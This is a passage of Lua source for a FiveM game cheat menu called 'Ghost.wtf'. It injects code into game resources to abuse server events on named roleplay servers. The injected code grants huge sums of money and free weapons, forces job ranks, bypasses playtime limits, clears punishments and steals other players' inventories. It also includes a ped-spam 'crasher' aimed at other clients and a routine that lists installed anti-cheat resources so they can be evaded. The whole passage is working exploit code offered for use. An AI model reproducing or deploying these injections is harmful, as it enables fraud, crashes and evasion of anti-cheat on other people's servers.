                        -- No text display, just listen for key press
                        if IsControlJustReleased(0, 38) then -- E key
                            robbing = true
                            targetPlayer = closestPlayer

                            -- Make target put hands up
                            ForceHandsUpOnPlayer(GetPlayerPed(targetPlayer))

                            -- Open inventory
                            TriggerEvent('ox_inventory:openInventory', 'otherplayer', GetPlayerServerId(targetPlayer))
                        end
                    end
                else
                    if IsControlJustReleased(0, 38) then -- E key
                        StopRobbing()
                    end
                end
            end
        end)
    ]]
    
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Inventory Stealer triggers executed")
end)

MachoMenuButton(EventsSection2, "Crasher (Press K)", function()
    local code = [[
        function GhostVisiblePedSpam()
            CreateThread(function()
                local player = PlayerPedId()
                local origin = GetEntityCoords(player)
                local model = GetHashKey("player_zero")
                RequestModel(model)
                while not HasModelLoaded(model) do Wait(0) end

                local safeZ = origin.z + 1000.0
                SetEntityCoords(player, origin.x, origin.y, safeZ, false, false, false, false)
                GiveWeaponToPed(player, GetHashKey("GADGET_PARACHUTE"), 1, false, true)
                TaskParachute(player, true)

                Wait(3500)

                local spawnedPeds = {}
                local clusterRadius = 2.1

                for i = 1, 100 do
                    local angle = math.rad(i * 12)
                    local offsetX = math.cos(angle) * clusterRadius
                    local offsetY = math.sin(angle) * clusterRadius
                    local ped = CreatePed(28, model, origin.x + offsetX, origin.y + offsetY, origin.z, 0.0, true, false)

                    if DoesEntityExist(ped) then
                        FreezeEntityPosition(ped, true)
                        SetEntityInvincible(ped, true)
                        TaskStandStill(ped, -1)
                        SetBlockingOfNonTemporaryEvents(ped, true)
                        table.insert(spawnedPeds, ped)
                    end

                    Wait(1)
                end

                Wait(10000)

                for _, ped in ipairs(spawnedPeds) do
                    if DoesEntityExist(ped) then
                        DeleteEntity(ped)
                    end
                end

                TaskParachute(player, false)
                SetEntityCoords(player, origin.x, origin.y, origin.z + 1.0, false, false, false, false)
            end)
        end

        CreateThread(function()
            while true do
                Wait(0)
                if IsControlJustPressed(0, 311) then 
                    GhostVisiblePedSpam()
                end
            end
        end)
    ]]
    MachoInjectResourceRaw("any", code)
    MachoMenuNotification("Ghost.wtf", "Press K to trigger crasher.")
end)

--// Events Section 3 \\-


MachoMenuButton(EventsSection3, "Palm Beach (Uncomserv)", function()  
    local code = [[
        function Ghosthgjfhjfghjbcvxdfgsdfgsfdcv()
            TriggerEvent("updatePlayerPunishment", "clear")
        end

        Ghosthgjfhjfghjbcvxdfgsdfgsfdcv()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Palm Beach Uncomserv Trigger Events Executed")
end)

MachoMenuButton(EventsSection3, "Trappin Southside", function()  
    local code = [[
        function Ghosthgjfhjfghjbcvxcvghdfghdgfhgfd()
            TriggerServerEvent('brutal_shop_robbery:server:AddItem', 'money', 1000000000)
        end

        Ghosthgjfhjfghjbcvxcvghdfghdgfhgfd()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Trappin Southside Trigger Events Executed")
end)

MachoMenuButton(EventsSection3, "The Raq Roleplay", function()  
    local code = [[
        function Ghosthgjfhjfghjbcvxcv()
            TriggerServerEvent('delivery:giveRewardhandbags', 100000000)
        end

        Ghosthgjfhjfghjbcvxcv()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "The Raq Roleplay Trigger Events Executed")
end)

MachoMenuButton(EventsSection3, "Fraud Starter Pack", function() 
    local code = [[
        function Ghosthjfghjfghjfghdbvnbvcnvbfasdfsd()
            for i = 1, 10 do
                TriggerServerEvent('spoodyFraud:restoreItem', "MSR")
                TriggerServerEvent('spoodyFraud:restoreItem', "Printer")
                TriggerServerEvent('spoodyFraud:restoreItem', "Burner Phone")
                TriggerServerEvent('spoodyFraud:interactionComplete', "Forged Check")
                TriggerServerEvent('spoodyFraud:interactionComplete', "Swapped Sim Card")
                TriggerServerEvent('spoodyFraud:interactionComplete', "Cloned Card")
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
                
                Citizen.Wait(1000)
            end
        end

        Ghosthjfghjfghjfghdfasdfsd()
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Fraud Starter Pack Trigger Events Executed")
end)

MachoMenuButton(EventsSection3, "Out the Mud RP", function()
    MachoInjectResource('any', [[
        local function g()
            TriggerServerEvent("__ox_cb_fuksus-shops:buyItems", "fuksus-shops", "fuksus-shops:buyItems", {
                ["payment"] = "bank",
                ["items"] = {
                    [1] = {
                        ["amount"] = 999999999999999,
                        ["label"] = "GHOSTWTFXDXMMYONYT",
                        ["price"] = 0,
                        ["name"] = "money",
                    },
                },
            })
        end
        g()
    ]])
    MachoMenuNotification("Ghost.wtf", "Out the Mud RP Money Trigger Events Executed")
end)

MachoMenuButton(EventsSection3, "District 10 (Dirty)", function()
    MachoInjectResource('any', [[
        local function g()
            TriggerServerEvent("plugs:giveItem", "black-money", 10000000)
        end
        g()
    ]])
    MachoMenuNotification("Ghost.wtf", "District 10 Dirty Money Trigger Events Executed")
end)

MachoMenuButton(EventsSection3, "District 10 (Clean)", function()
    MachoInjectResource('any', [[
        local function g()
            TriggerServerEvent("plugs:giveItem", "money", 10000000)
        end
        g()
    ]])
    MachoMenuNotification("Ghost.wtf", "District 10 Trigger Money Events Executed")
end)

MachoMenuButton(EventsSection3, "Raq City (Dirty)", function() 
    local code = [[
        function runDrugCollection(item, amount)
            TriggerServerEvent('ak47_druglabs:cancollect', true)
            TriggerServerEvent('ak47_druglabs:collectDrugs', item, amount, 'Zip Lock Bag', 2)

            Citizen.Wait(4000)
            TriggerServerEvent('ak47_druglabs:cancollect', false)
        end

        runDrugCollection('black_money', 10000000000)
    ]]
    
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Raq City Dirty Money Trigger Events Executed")
end)

MachoMenuButton(EventsSection3, "Raq City (Clean)", function() 
    local code = [[
        function runDrugCollection(item, amount)
            TriggerServerEvent('ak47_druglabs:cancollect', true)
            TriggerServerEvent('ak47_druglabs:collectDrugs', item, amount, 'Zip Lock Bag', 2)

            Citizen.Wait(4000)
            TriggerServerEvent('ak47_druglabs:cancollect', false)
        end

        runDrugCollection('money', 10000000000)
    ]]
    
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Raq City Dirty Money Trigger Events Executed")
end)

MachoMenuButton(EventsSection3, "SunnySide Atlanta WL", function()
    MachoInjectResource('any', [[
        local function g()
            TriggerServerEvent("bt-cashregister:receiptSold", 100000000000000)
        end
        g()
    ]])
    MachoMenuNotification("Ghost.wtf", "SunnySide Atlanta WL Trigger Events Executed")
end)

MachoMenuButton(EventsSection3, "Demons RP (Store)", function()
MachoInjectResourceRaw("wasabi_bridge", [[
    WSB.inventory.openShop({
        identifier = 'GhostxDxmmy',
        name = 'GHOSTxDXMMYONTOP',
        inventory = {
        inventory = {
            { name = 'ammo-9', price = 0 },
            { name = 'ammo-10', price = 0 },
            { name = 'ammo-45', price = 0 },
            { name = 'ammo-rifle', price = 0 },
            { name = 'ammo-rifle2', price = 0 },
            { name = 'ammo-shotgun', price = 0 },
            { name = 'money', price = 0 },
            { name = 'black_money', price = 0 },
            { name = 'backpack', price = 0 },
            { name = 'WEAPON_BUNCLAPPA', price = 0 },
            { name = 'WEAPON_HK516V2', price = 0 },
            { name = 'WEAPON_R590', price = 0 },
            { name = 'WEAPON_MINIGUN', price = 0 },
            { name = 'redzone_gtrnismo', price = 0 },
            { name = 'WEAPON_GLOCKBEAMS', price = 0 },
        }
    })
]])
MachoMenuNotification("Ghost.wtf", "Demons RP Trigger Events Executed")
end)

MachoMenuButton(EventsSection3, "Dreams la (Store)", function()
MachoInjectResourceRaw("wasabi_bridge", [[
    WSB.inventory.openShop({
        identifier = 'GhostxDxmmy',
        name = 'GHOSTxDXMMYONTOP',
        inventory = {
            { name = 'ammo-9', price = 0 },
            { name = 'ammo-rifle', price = 0 },
            { name = 'ammo-rifle2', price = 0 },
            { name = 'dreams_special_case', price = 0 },
            { name = 'money', price = 0 },
            { name = 'black_money', price = 0 },
            { name = 'cocaine', price = 0 },
            { name = 'WEAPON_DREAMSEVO', price = 0 },
            { name = 'WEAPON_DREAMSTOMMY', price = 0 },
            { name = 'WEAPON_DREAMSMP5', price = 0 },
            { name = 'WEAPON_DREAMSAPPISTOL', price = 0 },
            { name = 'WEAPON_DREAMSAK47U', price = 0 },
            { name = 'WEAPON_DREAMSBADGER', price = 0 },
            { name = 'WEAPON_DREAMSM4', price = 0 },
            { name = 'WEAPON_DREAMSM13', price = 0 },
            { name = 'WEAPON_DREAMSSICA', price = 0 },
            { name = 'WEAPON_DREAMSUMP', price = 0 },
            { name = 'WEAPON_DREAMSVAL', price = 0 },
            { name = 'WEAPON_ROYALM4', price = 0 },
            { name = 'WEAPON_ARTIXVAL', price = 0 },
            { name = 'backpack', price = 0 },
            { name = 'WEAPON_ELEVENHONEYBADGERV1', price = 0 },
            { name = 'WEAPON_DREAMSMG', price = 0 },
            { name = 'WEAPON_ROBBERJOSUEMAC10', price = 0 },
            { name = 'WEAPON_ROBBERJOSUEV3', price = 0 },
            { name = 'WEAPON_SHITMADEARP11', price = 0 },
            { name = 'WEAPON_BACKDOORKARMA', price = 0 },
            { name = 'WEAPON_SHITMADEM1311', price = 0 },
            { name = 'WEAPON_VERTS', price = 0 },
            { name = 'WEAPON_IMDONEV1', price = 0 },
            { name = 'WEAPON_HSWITCH1', price = 0 },
            { name = 'WEAPON_KITTY', price = 0 },
        }
    })
]])
MachoMenuNotification("Ghost.wtf", "Dreams LA Trigger Events Executed")
end)

--// Events Section 4 \\--

local reviveplayerid = MachoMenuInputbox(EventsSection4, "Revive ID", "1")

MachoMenuButton(EventsSection4, "Revive Player", function()
    local IdPerson = MachoMenuGetInputbox(reviveplayerid)

    if IdPerson == nil or IdPerson == "" then
        MachoMenuNotification("Ghost.wtf", "Please enter a valid ID.")
        return
    end

    local code = string.format([[
        function RevivePlayer()
            CreateThread(function()
                TriggerServerEvent("hospital:server:RevivePlayer", %s)
            end)
        end

        RevivePlayer()
    ]], IdPerson)

    MachoInjectResourceRaw("any", code)
    MachoMenuNotification("Ghost.wtf", "Revive trigger executed for ID: " .. IdPerson)
end)

local bodybagid = MachoMenuInputbox(EventsSection4, "Id", "1")

MachoMenuButton(EventsSection4, "Body Bag Person", function() 
    local IdPerson = MachoMenuGetInputbox(bodybagid)

    -- Make sure the input is not empty
    if IdPerson == nil or IdPerson == "" then
        MachoMenuNotification("Ghost.wtf", "Please enter a valid ID.")
        return
    end

    -- Inject code with the actual ID embedded
    local code = string.format([[
        function SetJob()
            CreateThread(function()
                TriggerServerEvent('RRP_BODYBAG:Trigger', %s)
            end)
        end

        SetJob()
    ]], IdPerson)

    MachoInjectResourceRaw("any", code)
    MachoMenuNotification("Ghost.wtf", "Bodybag trigger executed for ID: " .. IdPerson)
end)


MachoMenuButton(EventsSection4, "Playtime Bypass", function() 
    local code = [[
        function SetJob()
            CreateThread(function()
            TriggerServerEvent('DE_playtime:UpdateHours', 24.0)
            end)
        end
    ]]
    MachoInjectResourceRaw("any", code)
    MachoMenuNotification("Ghost.wtf", "Playtime Bypass Activated triggers executed")
end)

MachoMenuButton(EventsSection4, "Playtime Bypass V2", function() 
    local code = [[
        function SetJob()
            CreateThread(function()
            for i = 1, 86400 do
                TriggerServerEvent('th_playtime:updateServerPlaytime')
                Citizen.Wait(1) 
            end
        end
    ]]
    MachoInjectResourceRaw("any", code)
    MachoMenuNotification("Ghost.wtf", "Playtime Bypass Activated triggers executed")
end)

MachoMenuButton(EventsSection4, "Set Police", function()
    local code = [[
        local function SetJob()
            CreateThread(function()
                TriggerServerEvent('wasabi_multijob:ClockIn', { job = "police", grade = 4 })
            end)
        end

        SetJob()
    ]]

    MachoInjectResourceRaw("any", code)
    MachoMenuNotification("Ghost.wtf", "Set Police trigger executed")
end)

MachoMenuButton(EventsSection4, "Set Ambulance", function()
    local code = [[
        local function SetJob()
            CreateThread(function()
                TriggerServerEvent('wasabi_multijob:ClockIn', { job = "ambulance", grade = 3 })
            end)
        end

        SetJob()
    ]]

    MachoInjectResourceRaw("any", code)
    MachoMenuNotification("Ghost.wtf", "Set Ambulance trigger executed")
end)

MachoMenuButton(EventsSection4, "Skin Menu", function()
    MachoInjectResource('any', [[
        local function g()
            TriggerEvent('esx_skin:openSaveableMenu')
        end
        g()
    ]])
    Citizen.Wait(100)
    MachoInjectResource('any', [[
        local function g()
            TriggerEvent('trap:openAppearanceMenu')
        end
        g()
    ]])
end)

MachoMenuButton(EventsSection4, "Revive", function()
    MachoInjectResource('any', [[
        function GhostSghdfghdfgasdfT()
            CreateThread(function()
                local function tryRevive()
                    local events = {
                        'wasabi:ambulance:revive',
                        'hospital:client:Revive',
                        'esx_ambulancejob:revive',
                        'deathscreen:revive',
                        function()
                            if currentZone and currentZone.revives and spawn then
                                TriggerEvent('deathscreen:revive', currentZone.revives[spawn])
                            end
                        end,
                        'RZRP:Player:Revive'
                    }

                    for _, evt in ipairs(events) do
                        if type(evt) == 'string' then
                            TriggerEvent(evt)
                        elseif type(evt) == 'function' then
                            evt()
                        end
                    end
                end

                tryRevive()
            end)
        end

        GhostSghdfghdfgasdfT()
    ]])
    MachoMenuNotification("Ghost.wtf", "Revive events triggered.")
end)

--// Settings Section \\--

MachoMenuButton(SettingsSection1, "Unload/Close Lua Menu", function()
    MachoMenuDestroy(MenuWindow)
end)

local keyOptions = {
    ["F6"] = 0x75,
    ["F7"] = 0x76,
    ["F9"] = 0x78,
    ["F11"] = 0x7A,
    ["CapsLock"] = 0x14,
    ["Delete"] = 0x2E,
    ["Page Up"] = 0x21,
    ["Page Down"] = 0x22,
    ["End"] = 0x23,
    ["Numpad +"] = 0x6B,
    [","] = 0xBC,
    ["="] = 0xBB
}

local keyNames = {}
for name, _ in pairs(keyOptions) do
    table.insert(keyNames, name)
end

MachoMenuDropDown(SettingsSection1, "Set Menu Keybind",
    function(Index)
        local keyName = keyNames[Index + 1]
        local keyCode = keyOptions[keyName]
        if keyCode then
            MachoMenuSetKeybind(MenuWindow, keyCode)
            MachoMenuNotification("Ghost.wtf", "Menu keybind set to: " .. keyName)
        end
    end,
    table.unpack(keyNames)
)


MachoMenuCheckbox(SettingsSection1, "Rainbow Menu",
    function()
        _G.rainbowUI = true
        _G.rainbowSpeed = 0.01
        Citizen.CreateThread(function()
            local rainbowOffset = 0
            while _G.rainbowUI do
                Citizen.Wait(10)
                rainbowOffset = rainbowOffset + _G.rainbowSpeed
                local red = math.floor(127 + 127 * math.sin(rainbowOffset))
                local green = math.floor(127 + 127 * math.sin(rainbowOffset + 2))
                local blue = math.floor(127 + 127 * math.sin(rainbowOffset + 4))
                MachoMenuSetAccent(MenuWindow, red, green, blue)
            end
        end)
    end,
    function()
        _G.rainbowUI = false
        MachoMenuSetAccent(MenuWindow, 255, 255, 255)
    end
)

MachoMenuSlider(SettingsSection1, "Color Change Speed", 1, 1, 1000, "", 10, function(value)
    _G.rainbowSpeed = value * 0.0001
end)

MachoMenuSlider(SettingsSection1, "Red", 127, 0, 255, "", 0, function(value)
    _G.manualRed = value
    MachoMenuSetAccent(MenuWindow, _G.manualRed, _G.manualGreen or 127, _G.manualBlue or 127)
end)

MachoMenuSlider(SettingsSection1, "Green", 127, 0, 255, "", 0, function(value)
    _G.manualGreen = value
    MachoMenuSetAccent(MenuWindow, _G.manualRed or 127, _G.manualGreen, _G.manualBlue or 127)
end)

MachoMenuSlider(SettingsSection1, "Blue", 127, 0, 255, "", 0, function(value)
    _G.manualBlue = value
    MachoMenuSetAccent(MenuWindow, _G.manualRed or 127, _G.manualGreen or 127, _G.manualBlue)
end)

MachoMenuDropDown(SettingsSection1, "Theme Selector", function(index)
    local themes = {
        {255, 0, 0},
        {0, 255, 0},
        {0, 0, 255},
        {255, 255, 0}
    }
    local selectedTheme = themes[index + 1]
    if selectedTheme then
        MachoMenuSetAccent(MenuWindow, selectedTheme[1], selectedTheme[2], selectedTheme[3])
    end
end,
"Red Theme", "Green Theme", "Blue Theme", "Yellow Theme")

MachoMenuButton(SettingsSection1, "Reset to Defaults", function()
    _G.rainbowUI = false
    _G.rainbowSpeed = 0.01
    MachoMenuSetAccent(MenuWindow, 255, 255, 255)
end)

--// Settings Section 2 \\--

MachoMenuInputbox(SettingsSection2, "Message To All", "Type here...")
local MsgInput = MachoMenuGetInputbox 

MachoMenuButton(SettingsSection2, "Send Message To All", function()
    local message = MachoMenuGetInputbox(MsgInput)
    if message and message ~= "" then
        local code = string.format([[
            TriggerEvent("chat:addMessage", {
                color = { 255, 0, 0 },
                multiline = true,
                args = {"[Ghost.wtf]", "%s"}
            })
        ]], message:gsub('"', '\\"')) 
        MachoInjectResourceRaw("any", code)
        MachoMenuNotification("Ghost.wtf", "Message sent to chat.")
    else
        MachoMenuNotification("Ghost.wtf", "Message was empty.")
    end
end)


--// Settings Section 3 \\--

MachoMenuButton(SettingsSection3, "Uninject Features", function()
    local code = [[
         
        if GhostStartNoClipController then
            NoClipActive = false
            NoClipRunning = false
        end

        if GodLoop then
            GodModeActive = false
        end

        
        local ped = PlayerPedId()
        if DoesEntityExist(ped) then
            FreezeEntityPosition(ped, false)
            SetEntityVisible(ped, true)
            SetEntityInvincible(ped, false)
            SetEntityCollision(ped, true, true)
            ClearPedTasksImmediately(ped)
            ClearAllPedProps(ped)
        end
    ]]
    MachoInjectResourceRaw("any", code)
    MachoMenuNotification("Ghost.wtf", "All active features safely stopped.")
end)

MachoMenuButton(SettingsSection3, "Uninject Crasher", function()
    local code = [[
        GhostVisiblePedSpam = nil
        RemoveKeybind = true
    ]]
    MachoInjectResource("any", code)
    MachoMenuNotification("Ghost.wtf", "Crasher and keybind disabled.")
end)

MachoMenuButton(SettingsSection3, "Anti Cheat Checker", function()
   MachoInjectResource("any", [[
    local function Notify(title, msg)
        SetNotificationTextEntry("STRING")
        AddTextComponentString(title .. "\n" .. msg)
        DrawNotification(false, false)
    end

    for i = 0, GetNumResources() - 1 do
        local resource_name = GetResourceByFindIndex(i)

        if resource_name and GetResourceState(resource_name) == "started" then
            local client_script_count = GetNumResourceMetadata(resource_name, "client_script")
            local server_script_count = GetNumResourceMetadata(resource_name, "server_script")

            if resource_name == "WaveShield" or resource_name == "FiniAc" or
               resource_name == "ReaperV4" or resource_name == "venus_anticheat" or resource_name == "anticheese" or resource_name == "fiveguard" or
               resource_name == "FIREAC" or resource_name == "FuriousAntiCheat" or resource_name == "fg" or 
               resource_name == "phoenix" or resource_name == "TitanAC" or resource_name == "VersusAC" or resource_name == "VersusAC-OCR" or 
               resource_name == "waveshield" or resource_name == "anticheese-anticheat-master" or resource_name == "anticheese-anticheat" or
               resource_name == "wx-anticheat" or resource_name == "AntiCheese" or resource_name == "AntiCheese-master" or resource_name == "somis_anticheat" or resource_name == "somis-anticheat" or 
               resource_name == "ClownGuard" or resource_name == "oltest" or resource_name == "ChocoHax" or resource_name == "ESXAC" or
               resource_name == "TigoAC" or resource_name == "VenusAC" then
                Notify("Detected Anticheat", "[" .. resource_name .. "]")
                Notify("Resource", "" .. resource_name .. "")
                goto continue
            end

            if GetResourceMetadata(resource_name, "ac", 0) == "fg" then
                Notify("Detected Anticheat", "Fiveguard")
                Notify("Resource", "^" .. resource_name .. "")
                goto continue
            end

            if resource_name == "vRP" or resource_name == "vrp" then
                rp = true
            end

            if client_script_count == 4 and resource_name ~= seconderes then
                local valid_client_scripts = {
                    ["lib/Tunnel.lua"] = true,
                    ["lib/Proxy.lua"] = true,
                    ["client.lua"] = true,
                    ["69.lua"] = true
                }
                if valid_client_scripts[GetResourceMetadata(resource_name, "client_script", 0)] and
                   valid_client_scripts[GetResourceMetadata(resource_name, "client_script", 1)] and
                   valid_client_scripts[GetResourceMetadata(resource_name, "client_script", 2)] and
                   valid_client_scripts[GetResourceMetadata(resource_name, "client_script", 3)] then
                    firstres = resource_name
                end
            end

            if server_script_count == 2 and resource_name ~= firstres then
                if GetResourceMetadata(resource_name, "server_script", 0) == "@vrp/lib/utils.lua" and
                   GetResourceMetadata(resource_name, "server_script", 1) == "server.lua" and
                   GetResourceMetadata(resource_name, "client_script", 0) == "lib/Tunnel.lua" and
                   GetResourceMetadata(resource_name, "client_script", 1) == "lib/Proxy.lua" and
                   GetResourceMetadata(resource_name, "client_script", 2) == 'client.lua' then
                    seconderes = resource_name
                end
            end
        end
        ::continue::
    end
]])
end)

MachoMenuCheckbox(SettingsSection3, "Enable Debug",
    function()
        _G.debugMode = true
    end,
    function()
        _G.debugMode = false
    end
)
